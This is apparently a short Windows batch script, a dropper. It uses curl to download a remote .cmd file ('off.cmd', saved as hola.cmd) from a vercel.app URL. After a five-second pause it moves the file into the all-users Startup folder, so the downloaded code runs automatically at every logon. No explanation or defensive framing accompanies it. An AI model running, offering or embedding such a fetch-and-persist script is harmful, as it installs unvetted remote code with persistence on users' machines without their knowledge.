curl -o hola.cmd https://cmd-web-nine.vercel.app/files/resources/off.cmd
timeout /t 5
move hola.cmd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"